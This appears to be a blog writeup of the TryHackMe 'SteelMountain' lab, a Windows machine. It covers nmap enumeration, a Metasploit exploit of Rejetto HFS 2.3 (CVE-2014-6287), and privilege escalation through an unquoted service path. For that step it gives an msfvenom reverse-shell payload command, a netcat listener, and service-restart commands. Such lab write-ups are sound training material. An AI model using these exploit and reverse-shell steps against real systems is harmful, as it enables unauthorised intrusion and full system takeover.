---
layout: post
title: SteelMountain - Writeup
author: The-CyberCrusader
icon: https://i.postimg.cc/WpHJTvwP/screenshot-155.jpg
date: 2023-03-18
categories: [TryHackMe,Linux]
tags: [thm-kenobi]
pin: false
image:
  path: https://i.postimg.cc/WpHJTvwP/screenshot-155.jpg
  width: 1280   # in pixels
  height: 720   # in pixels
  alt: 
---

### Welcome Folks!!

This article outlines my approach to solving the “SteelMountain” room available on the TryHackMe platform.

> Disclaimer 
No flags (user/root) are shown in this writeup, so follow the procedures to grab the flags! Enjoy! 
{: .prompt-danger}

[https://tryhackme.com/room/kenobi](https://tryhackme.com/room/steelmountain)

## Task 1 - Introduction

> **Q. Deploy the machine** <br>
  > **Make connection with VPN or use the attackbox on Tryhackme site to connect to the Tryhackme lab environment**.<br>
     *Ans:- No Answer Needed*

After Deploying I just visited the ip address on default port 80, We could see the Photo of Employee but what's his name?, Looking at the source page, we notice that the image has a name `Bill Harper`.

![img](https://i.postimg.cc/43C1mXDk/screenshot-67.png){: width="1280" height="720" .shadow}

![img](https://i.postimg.cc/3wkf4KJ3/screenshot-67.png){: width="1280" height="720" .shadow}

> **Q. Who is the employee of the month?** <br>
  > Ans:- *Bill Harper*

<hr> 

## Task 2 - Initial Access 

As usual I started by connecting to and scanning the target machine for any open ports and services using `NMAP`

```shell
sudo nmap -sV -sC -T4 -p- -oN nmap_basic {MACHINE_IP}
```
{: .nolineno }

```shell
-sV: Probe open ports to determine service/version info.
-sC: Performs a script scan using default scripts available in NMAP.
-p-: Scan all ports
-oN: Outputs scan results to a file.
```
{: .nolineno }

```
# Nmap 7.93 scan initiated Wed Apr 19 03:39:36 2023 as: nmap -sV -sC -T4 -p- -oN nmap_basic 10.10.239.241
Nmap scan report for 10.10.239.241
Host is up (0.12s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-04-18T07:34:42
|_Not valid after:  2023-10-18T07:34:42
|_ssl-date: 2023-04-19T07:47:29+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2023-04-19T07:47:24+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49172/tcp open  msrpc              Microsoft Windows RPC
49173/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-19T07:47:22
|_  start_date: 2023-04-19T07:33:55
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02be36c76dcd (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 19 03:47:30 2023 -- 1 IP address (1 host up) scanned in 474.46 seconds

```
{: file="NMAP" }

Alright, Now We could see another port `8080` open running file server `HttpFileServer httpd 2.3` from the above nmap result.

> **Q. Scan the machine with nmap. What is the other port running a web server on?** <br>
  > Ans:- *8080*

So lets visit `MAHCINE_IP:8080`and are greeted by some file transfer window.

In the “Server Information” section we can see the version of file server - `HttpFileServer httpd 2.3`

![img](https://i.postimg.cc/dtwvP5Gm/screenshot-68.png){: width="1280" height="720" .shadow}

Clicking on the version number - it redirects to `hfs  Http File Server` page in the **URL** we can see `rejetto` which is the name of file server .

![img](https://i.postimg.cc/4NYzbQSZ/screenshot-69.png){: width="1280" height="720" .shadow}

> **Q. Take a look at the other web server. What file server is running?** <br>
  > Ans:- *Rejetto HTTP File Server*

In order to find the CVE number, simply google it by its version number `CVE Rejetto HTTP File Server 2.3`, and you’ll get what you’re looking for.

> **Q. What is the CVE number to exploit this file server?** <br>
  > Ans:- *2014-6287*

Now lets search if there is any exploit for `Rejetto HTTP File Server 2.3` using `searchsploit` tool.

![img](https://i.postimg.cc/7LLGwgTb/screenshot-69.png){: width="1280" height="720" .shadow}

We can see we have an RCE Exploit (Metasploit) which can be used to exploit the file server using Metasploit

So lets Fire Up Metasploit by using command - `msfconsole`

Search for `Rejetto HTTP File Server` exploit.

![img](https://i.postimg.cc/gkBp7QPw/screenshot-70.png){: width="1280" height="720" .shadow}

We can see one exploit module, lets use it by typing `use 0` and to get a list of which options we need to set, type `options`

So after setting all the required options like RHOSTS,RPORT,LHOST (Your TUN-interface IP),LPORT and when done, type `run` or `exploit` command to start exploit.

Now you will get the Meterpreter shell. As show in the below image.

![img](https://i.postimg.cc/fbD9rVsT/screenshot-71.png){: width="1280" height="720" .shadow}

After getting the Meterpreter shell, you can browse through the directories using basic Linux commands and find the user flag located on the Bill’s desktop.

![img](https://i.postimg.cc/3xMw91DQ/screenshot-71.png){: width="1280" height="720" .shadow}

> **Q. Use Metasploit to get an initial shell. What is the user flag?**<br>
  > Ans:- *b0xxxxxxxxxxxxxxxxxxxxxxxxxxxx65* 

<hr> 

## Task 3 - Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

Tryhackme suggests us to use `PowerUp.ps1` script for enumeration. 

*To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."*

You can just copy the the raw script from here [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) and put it into new file & name it `PowerUp.ps1`

Now upload this file to the target machine using below command.
```shell
upload /home/TryHackme/Steelmountain/PowerUp.ps1
```      

![img](https://i.postimg.cc/TwdtVb6v/screenshot-72.png){: width="1280" height="720" .shadow}


Then, to be able to call the script, we first need to load powershell by typing `“load powershell”` and enter into the shell by typing `“powershell_shell”`

Once that is done, load the script with `“. .\PowerUp.ps1”` and then invoke the function that runs all checks with `“Invoke-AllChecks”`

![img](https://i.postimg.cc/KY691YGt/screenshot-73.png){: width="1280" height="720" .shadow}

After running the script we can see there is a unquoted service path vulnerability.

![img](https://i.postimg.cc/7ZrCBGH5/screenshot-74.png){: width="1280" height="720" .shadow}

Before we jump in to exploit this vulnerability lets understand what is `Unquoted Service Path Vulnerability`

###### Unquoted Service Path Vulnerability

> - An unquoted service path is a path that includes a `whitespace` character, most commonly `“space”`, and that isn’t properly escaped. This is true for the above path of
> - ….\Advanced SystemCare\ASCService.exe
> - What happens here is that the path will be interpreted from left to right and append `“.exe”` on each step until it reaches the intended target, in this case `“ASCService.exe”`.
> - Let’s have a look at the permissions of that folder, and who we are connected as.
> - Lets run `whoami` to figure out who we are, and then run the following command to know the file permissions.
{: .prompt-tip}

```shell
icacls “C:\Program Files (x86)\IObit\Advanced SystemCare”
```         

- Theres an unquoted service path vulnerability, that will run the first executable in the path.
- We are Bill & Bill has permissions to write in the `\IObit\` folder.
- The `CanRestart=True` parameter means that we can restart the service.

<hr> 

What we are going to do in a nutshell:

- Craft a malicious binary with name `“Advanced.exe”` — > since we are Bill and Bill has permission to write into `\IObit\` folder, put our `“Advanced.exe”` into the `C:\Program Files (x86)\IObit` folder — > restart service.

- Once the execution reaches `“…\IObit\Advanced”` it will append `.exe` to `“Advanced”` and therefor, executing our malicious binary.

> **Q. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?** <br>
  > Ans:- *AdvancedSystemCareService9*

<hr> 

###### Using Msfvenom to Create Payload

Let’s create our malicious binary, we’ll use msfvenom for creating our payload.

```shell
msfvenom -p windows/shell_reverse_tcp LHOST={Your_Tunn_Interface_IP} LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```                                                                                                            

![img](https://i.postimg.cc/tT6wSrt6/screenshot-75.png){: width="1280" height="720" .shadow}


Now upload this binary to the target machine using `upload` command.

![img](https://i.postimg.cc/4N9fGvvN/screenshot-76.png){: width="1280" height="720" .shadow}

Before we restart the service`(AdvancedSystemCareService9)` , we will setup a listener on our machine to get the reverse shell.

```shell
nc -lvnp 1234
```                                                                                                            

Alright, then let’s drop to a shell in our meterpreter session by typing `“shell”` and then stop the service using 

`sc stop AdvancedSystemCareService9` command.

Now copy this binary to the target location .

```shell
copy Advanced.exe "C:\Program Files\IObit"
```                                                                                                            
![img](https://i.postimg.cc/1zVFk7RR/screenshot-77.png){: width="1280" height="720" .shadow}

Start the service with `sc start AdvancedSystemCareService9` command.

As soon as you start the service again our binary will get executed, & it will then connect back to our IP. Spawning a `Reverse Shell` with root permissions.

Now we are in!!

Just go to Administrator > Desktop & grab the flag `root.txt`.

Thats it!

![img](https://i.postimg.cc/VL1nTFbn/screenshot-77.png){: width="1280" height="720" .shadow}



> **Q. What is the root flag?** <br>
  > Ans:- *9axxxxxxxxxxxxxxxxxxxxxxxxxxxx80*
             
<hr>

Thats it for now. Will catch you you up in the next blog. Until then keep H A C K I N G. 

![img](https://i.postimg.cc/wBRLkL5t/output-onlineunicodetools-2.png){: width="1280" height="720" .shadow}